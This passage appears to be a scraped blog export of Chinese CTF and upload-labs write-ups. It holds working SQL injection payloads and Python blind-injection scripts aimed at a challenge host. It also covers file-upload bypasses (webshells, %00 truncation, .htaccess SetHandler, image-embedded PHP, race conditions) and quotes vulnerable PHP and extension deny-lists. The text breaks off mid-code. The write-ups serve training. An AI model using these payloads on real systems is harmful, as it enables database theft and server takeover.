回显结果还是出现 那就换手工注入，观察到底过滤了什么输入?id=&#39;=&#39;得出列数为一列测试闭合符号输入 1?id=1' 报错输入 1?id=1' ' 还是报错 但是输入 1?id=1'' 回显正常说明这里把空格给过滤了，可以再输入一些其他的来验证一下输入 1?id=1' and '1'='1 回显错误输入 1?id=1'and'1'='1 回显正确，果然是过滤了空格，在sql注入之一，通过/**/来绕过空格，这次就再用一次 查数据库 1?id=1'union/**/select/**/database()/**/' 查数据表 1?id=1'union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web1 查字段 1?id=1'union/**/select/**/group_concat(column_namcolumn_namee)/**/from/**/information_schema.columns/**/where/**/table_name='flag 这次竟然显示了，然而没高兴过一秒就又不行了查值 1?id=1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1 简单的sql注入之3方法一、布尔盲注一开始做没注意提示是报错提示，就用布尔盲注去尝试，结果还是可以做的 闭合符号还是&#39;，这里就不再演示了 正常输入的话回显为：那就构造一下布尔盲注查数据表的语句看是否可行 1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;1 --+ 回显正常，说明可以进行布尔盲注 可以手工注入，也可以写脚本跑出来，这里就写脚本跑出来 猜解长度12345678910111213141516171819import requestsdef len(): for i in range(1,5): url = '''http://ctf5.shiyanbar.com/web/index_3.php''' #猜表名长度 payload = '''?id=1' and length(database())&gt;%s''' %i #猜字段长度 #payload = '''?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;%s ''' %i #猜值长度 #payload = '''?id=1' and (select length(column_name) from information_schema.columns where table_name ='flag' limit 0,1)&gt;%s''' # print(url+payload+'%23') r = requests.get(url+payload+'%23') if 'Hello!' in r.text: print(i) else: #print('false') print('database_length:',i)len() 猜解数据 1234567891011121314151617181920212223242526import requestsdef get_value(): name = '' #根据猜解的长度进行改变 for j in range(1,5): for i in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#123;&#125;_@!': #爆出表名 url = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1)))=ord('%s')\" %(j,i) #爆出列名 #url = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='flag' limit 1,1),%d,1)))=ord('%s')\" %(j,i) #爆值 #url = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (ascii(substr(( select flag from flag limit 0,1),%d,1)))=ord('%s')\"%(j,i) # print(url+'%23') r = requests.get(url+'%23') if 'Hello!' in r.text: name = name+i print(name) break print('value:',name)get_value() 但是在猜解字段长度和猜解字段的时候又出现这个问题 就不管这个问题，之前一直以为脚本中的payload又错误，结果是服务器有错误，所以无法跑出列名，查看大师父们的博客，发现列名还是flag，好吧，继续跑值 由于脚本中range的长度是1-5，所以只能跑出就将range的范围改的大一些，改为1-30因为python还不太熟练，所以写的脚本还比较菜，继续努力学习写脚本吧 方法二、报错注入不过这样就结束了？，我还一直在疑惑，这题道将哪些东西给过滤了，结果提交的时候发现报错注入，那就再用报错注入来做一遍 用常用的语句尝试一下 1?id=2' select count(*) from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+ 回显结果为：说明floor函数已经被过滤了，查一下报错注入常用的其他函数十种MySQL报错注入updatexml报错注入SQL注入之报错注入的一些随笔 12345678910floor()extractvalue()updatexml()geometrycollection()multipoint()polygon()multipolygon()linestring()multilinestring()exp() updatexml () 函数1?id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) from admin limit 0,1),0x7e),1)--+ extractvalue()报错 1?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+ updatexml()报错注入 1?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ exp()报错注入 1?id=1' union select (exp(~(select * FROM(SELECT USER())a)))--+ 终于让找到没有被过滤的函数了查数据表1?id='or exp(~(Select * From (select group_concat(table_name) from information_schema.tables where table_schema=database())x)) %23 这就没意思了吧。。。。都不能用，算了就顺便总结一下payload，方便以后用exp()报错注入 查数据库 1?id='or exp(~(Select * From (select database())x)) %23 查数据表 1?id='or exp(~(Select * From (select group_concat(table_name) from information_schema.tables where table_schema=database())x)) %23 查字段 1?id='or exp(~(Select * From (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag')x)) %23 查值 1?id='or exp(~(Select * From (select flag from flag)x)) %23 附上大师傅博客，向大师傅学习V0W 原本想用sqlmap工具来做，谁知道虚拟机崩了，没法打开，最近可真倒霉，phpstudy崩完，虚拟机崩，唉（还要再去解决虚拟机的问题） 累啊 感悟：一道题不只一种解法，多尝试其他方法拓宽自己的思路，最近也比较烦躁，总觉得做题没意思，不会了只会看大师傅的writeUp，一做题就懵逼，做一道题可能就用一上午，不过那这也是正常的，还是得耐心点，不是为了做题而做题，切记不要浮躁, 继续努力，有困难就解决！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"文件上传漏洞——upload-labs(11-20)","slug":"文件上传漏洞——upload-labs(11-20)","date":"2019-08-03T12:01:24.000Z","updated":"2019-08-07T09:44:05.057Z","comments":true,"path":"2019/08/03/文件上传漏洞——upload-labs(11-20)/","link":"","permalink":"http://bealright.github.io/2019/08/03/文件上传漏洞——upload-labs(11-20)/","excerpt":"","text":"前言：上次文件上传漏洞学习到第十关，这次继续学习 第十一关分析源码前面几行代码都是对后缀名进行限制，最重要的就是这一句代码 1$img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; 发现save_path用户是可控的，那么就利用%00截断来绕过 在此之前，先来了解一下截断上传的原理 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片 可以通过一个例子详解的了解一下 12345&lt;% path=\"upload/web/\" file=\"1.jpg\" upfilename=path &amp; file '最后的上传地址 %&gt; 将路径改为path=&quot;upload/web/1.php%00&quot;,那么拼接之后，文件上传时就变成了&quot;upload/web/1.php%001.jpg&quot;，这时上传便将1.php上传进去，而1.jpg则被截断，我理解的就是相对于省略符号，将后面的内容给省略了，相当于MySQL注入语句中的#、--+等 下面就来做题，几乎是一模一样上传成功 不过在上传时我才明白，原来截断了1 .jpg，但是1.jpg的内容是被1.php给继承过去了，我还一直认为是必须自己创建1.php, 里面包含内容那。。。，这次真的学习到了 方法：%00截断 附上大师傅们的博客截断上传原理剖析00截断原理分析 差点忘记了最重要的一条，要进行配置才能进行%00绕过 截断条件： php版本要小于5.3.4 magic_quotes_gpc需要为Off状态 找到并修改即可 第十二关分析源码和十一关的代码基本相同，但是有一个点是不同的$_POST[&#39;save_path&#39;]，save_path是通过post传进来的，只是传进来的方式不同，绕过的方法应该还是%00截断 但是这次不能直接抓包在后面加上%00，因为post不会像get一样对%00进行自动解码，所以得换另一种方法进行%00绕过，查看大师傅的做法才知道要在二进制中进行修改 将70 68 70后面的2b改为00即可绕过 上传成功方法：%00截断 第十三关 那就先来做图片木马 输入命令1copy 1.jpg /b + 1.php /a shell.jpg 一句话木马确实已经插入 接下来就结合文件包含漏洞将图片中的php文件进行解析 upload-labs自带有文件包含漏洞 1http://127.0.0.1/upload/include.php?file=upload/2020190806155326.jpg 解析成功 分析一下源码 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\");//fopen() 函数打开文件或者 URL，\"r\" 只读方式打开，将文件指针指向文件头 $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 可以看出做出限制的是这一段代码 1$bin = fread($file, 2); //只读2字节 通过读文件的前2个字节判断文件类型,没有其他防护，所以可以上传图片马解析即可 第十四关用十三关的图片马一样可以解析分析一下源码 12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename);//getimagesize() 函数用于获取图像大小及相关信息 $ext = image_type_to_extension($info[2]);//image_type_to_extension — 根据指定的图像类型返回对应的后缀名。 if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 进行限制的是这两段代码 12$info = getimagesize($filename);$ext = image_type_to_extension($info[2]); 通过使用getimagesize()检查是否为图片文件，所以还是可以用第十三关的图片马绕过 第十五关查看一下源码 1234567891011121314151617181920212223242526272829303132333435function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 做出限制的代码为： 1$image_type = exif_imagetype($filename); exif_imagetype函数获取图片类型，使用exif_imagetype()检查是否为图片文件，所以还是可以用第十关的方法，这几关可以了解一些获取图片类型的函数 第十六关如果还使用第十三关的图片马，发现其中的PHP代码没有解析出来，分析一下源码，看下源码都做出了那些限制 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path);//imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像 if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125; 先来了解一下代码中出现的一些函数 123456imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像move_uploaded_file() 函数将上传的文件移动到新位置。 上面的代码判断了文件后缀和content-type，而且后面的代码又考察了二次渲染看了很多大师傅们的博客，都说这道题考查的是图像的二次渲染，但同时这段代码是存在逻辑漏洞的 1if(move_uploaded_file($tmpname,$target_path)) 用move_uploaded_file（）作if条件做判断时，如果返回true，上传的文件不管是否符号要求，到可以上传到服务器，不过这里主要考察的是二次渲染，接下来就用最简便的GIF图片来绕过二次渲染 上传GIF图片马上传发现没有解析成功，将上传的图片下载下来，用winhex打开观察一下经过二次渲染，发现文件名已经改变而且末尾的PHP代码已经被去除，既然后面插入不了那就对比一些上传前和上传后的图片，看看那些部分是没有改变的，将一句话插入其中经过对比，这一段都是相同的，可以将代码插入其中，发现上传后的图片依然有PHP代码，上传成功还有JPEG和PNG图片上传，但是都需要脚本，这里就暂时先不用这两种方法了，不过可以参考大师傅的博客，upload-labs之pass 16详细分析 方法： 图片对比，在winhex将代码插入到相同的部位进行绕过 第十七关提示：需要代码审计！ 那就来分析代码 123456789101112131415161718192021222324$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name;//in_array() 函数搜索数组中是否存在指定的值。//rename() 函数重命名文件或目录。 if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 12345if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; 这一段代码先将文件上传到服务器，再判断后缀名，如果合法则保留下来，如果不合法，后面这段代码则起删除作用，删除在服务器的文件 12$msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); unlink() 函数删除文件 所以根据这个流程，可以通过条件竞争的方式在unlink()函数删除之前，访问上传文件，在此之前先来了解一下条件竞争 条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 接下来就利用条件竞争删除文件的时间差绕过 在burp中不断发送上传webshell的数据包，然后不断在浏览器中访问，发现通过竞争可以访问到，设置多线程控制攻击请求的并发数，但是我的burp有问题，无法设置多线程，所以没有办法复现出来 方法：条件竞争 第十八关随便上传图片马，发现审计一下代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//index.php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125;//myupload.phpclass MyUpload&#123;.................. var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); &#125;.................. &#125;; 先是 $ret = $this-&gt;move();，进行了一次文件保存，然后再 $ret = $this-&gt;renameFile();，进行了一次更改文件名，所以可以用条件竞争来进行绕过 方法：条件竞争 第十九关发现和之前有些不一样查看一下源码 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);//pathinfo() 函数以数组的形式返回文件路径的信息。 if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传出错！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 查看大师傅的博客，发现move_uploaded_file会忽略掉文件末尾的/.而且文件名是从$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]中获取的，所以用户是可以进行控制的，所以通过/. 来进行绕过 上传成功除此之外那也可以用用move_uploaded_file函数的00截断漏洞绕过 第二十关来源一道CTF题，需要审计代码，目前自己还审计不了，就参考大师傅们的，暂时先留到这，等水平提高了，再回头看这道题 总结：通过upload-labs又学习到了很多很好玩的知识，接下来学习又关密码学的知识，少年，继续加油！ 参考博客：Upload-labs 20关通关笔记Upload-labs通关手册","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://bealright.github.io/tags/文件上传/"}]},{"title":"文件上传漏洞——upload-labs(1-10)","slug":"文件上传漏洞——upload-labs(1-10)","date":"2019-08-01T12:01:24.000Z","updated":"2019-08-07T07:41:44.196Z","comments":true,"path":"2019/08/01/文件上传漏洞——upload-labs(1-10)/","link":"","permalink":"http://bealright.github.io/2019/08/01/文件上传漏洞——upload-labs(1-10)/","excerpt":"","text":"前言：文件上传漏洞有很多种绕过技巧，这次就通过upload-labs进行学习 第一关上传有限制，只让上传JPEG或PNG格式的图片，就先尝试一下抓包修改上传格式的方法看看是否可行 先将一句话木马PHP文件后缀名改为PNG格式，上传拦截抓包 拦截请求包后，将1.png改为1.php，再发包，用菜刀进行连接，在此之前需要知道上传的文件上传到哪个目录下，查看源码查出图片上传路径路径也知道了，就用菜刀进行连接连接成功观察一下第一关的源码1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 通过观察只是限制了在上传时的类型，所以中途拦截抓包改格式的方法是完成可行的。 方法：改包绕过上传 第二关做第二关时发现沿用第一关的方法也是可行的，不过应该不会再考同一个点了 就查看一下源码 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 发现这一段代码判断content-type,那就可以通过修改content-type进行绕过： 1if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) 抓包将application/octet-stream修改为image/png或image/gif都可以连接成功方法：修改content-type进行绕过 第三关上传PHP文件时，发现有这样的提示应该是源码中限制了这些文件的后缀名，查看大师傅们的博客发现还可以用1phtml，php3，php4, php5, pht 这些后缀名进行绕过，就来尝试一下，发现连接不上去，查了一下才知道原来前提是apache的httpd.conf中有如下配置代码1AddType application/x-httpd-php .php .phtml .phps .php5 .pht 我这里使用的是phpstudy+windows，即使添加了也不管用，查了大师傅的博客才知道是由于配置原因是解析不了php5等等这些后缀的，所以复现不了，可以在虚拟机中复现这关。不过也知道了这一关是采用拓展名绕过查看一下源码123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']);//trim() 函数移除字符串两侧的空白字符或其他预定义字符 $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.');//strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123;//in_array() 函数搜索数组中是否存在指定的值 $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 观察源码就会发现这里确实采用黑名单来限制 方法：拓展名绕过 第四关没什么思路，查看一下提示发现基本上将所有非法的脚本后缀都禁用了，还是黑名单限制，查看一下源码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 果然是将所有非法的脚本后缀都禁用了，但是没有禁用.htaccess，先来了解一下htaccess文件的作用，.htaccess的基本作用及相关语法介绍 在这里使用htaccess文件目的是为了将所有文件都当成php文件来解析创建一个.htaccess文件1SetHandler application/x-httpd-php 在文件中写入该段代码，上传时将文件名去掉，只要后缀名上传后，上传图片马，由于连接菜刀麻烦，这里就修改一句话语句为1&lt;?php phpinfo(); ?&gt; 上传图片马成功后，进行查看解析成功 方法：.htaccess文件进行绕过 第五关上传.htaccess文件，发现该后缀名也被加入黑名单了查看源码1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 通过观察，发现黑名单中限制的后缀名没有将大小写统一，采用大小写方式进行绕过上传成功，进行查看 方法：大小写绕过 第六关无论如果改后缀名都无法上传，说明这关代码已经统一了大小写查看源码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 